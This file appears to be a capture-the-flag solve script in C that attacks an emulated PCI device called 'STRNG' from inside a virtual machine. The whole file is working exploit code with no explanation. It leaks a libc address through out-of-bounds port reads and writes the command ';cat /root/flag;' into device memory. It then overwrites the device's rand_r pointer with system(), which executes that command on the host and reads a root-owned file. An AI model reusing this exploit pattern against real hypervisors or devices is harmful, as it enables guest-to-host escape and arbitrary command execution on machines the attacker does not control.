/* 
 * author: luckasdf0
 * build: gcc ./solve.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/io.h>

#define LOG(...) printf(__VA_ARGS__)

void die(const char* msg) {
    perror(msg);
    _exit(-1);
}

void hexdump(uint8_t *mem, size_t len) {
    for (size_t i = 1; i <= len; i++) {
        printf("%02x ", mem[i-1]);
        if (i % 16 == 0)
            printf("\n");
        else if (i % 8 == 0)
            printf("  ");
    }
}

#define STRNG_MMIO_ADDR 0x00000000febf1000
#define STRNG_MMIO_SIZE 0x100
#define STRNG_MMIO_MAP_BASE 0xdead0000

#define STRNG_PMIO_BASE 0x000000000000c050
#define STRNG_PMIO_SIZE 0x8

void pmio_write(uint64_t addr, uint32_t value) {
    outl(value, STRNG_PMIO_BASE+addr);
}

uint32_t pmio_read(uint64_t addr) {
    return inl(STRNG_PMIO_BASE+addr);
}

int main(int argc, char const* argv[]) {
    int devmem_fd;
    uint64_t libc_srandom = 0;
    uint64_t libc_base = 0;
    uint64_t libc_system = 0;

    if (iopl(3) != 0) {
        die("iopl");
    }

    devmem_fd = open("/dev/mem", O_RDWR | O_SYNC);
    if (devmem_fd < 0) {
        die("open /dev/mem");
    }

    if (!mmap((void *)STRNG_MMIO_MAP_BASE, STRNG_MMIO_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, devmem_fd, STRNG_MMIO_ADDR)) {
        die("mmap mmio");
    }
    close(devmem_fd);
    
    // leak
    pmio_write(0, 0x104);
    libc_srandom = pmio_read(4);
    pmio_write(0, 0x108);
    libc_srandom += ((uint64_t)pmio_read(4))<<32;
    libc_base = libc_srandom - 0x3a8d0;
    LOG("libc_srandom : 0x%016llx", libc_srandom);
    LOG("libc_base : 0x%016llx", libc_base);
    libc_system = libc_base + 0x45390;
 
    // prepare argument for system
    pmio_write(0, 0x8);
    pmio_write(4, 1852400175);
    pmio_write(0, 0xc);
    pmio_write(4, 0x41414141);
    pmio_write(0, 0x10);
    pmio_write(4, 1952539451); // ";cat"
    pmio_write(0, 0x14);
    pmio_write(4, 1869754144); // " /ro"
    pmio_write(0, 0x18);
    pmio_write(4, 1714386031); // "ot/f"
    pmio_write(0, 0x1c);
    pmio_write(4, 996630892); // "lag;"

    // overwrite rand_r
    pmio_write(0, 0x114);
    pmio_write(4, libc_system&0xffffffff);
    pmio_write(0, 0x118);
    pmio_write(4, libc_system>>32);

    // triger
    pmio_write(0, 0xc);
    pmio_write(4, 0xdeadbeef);

    return 0;
}
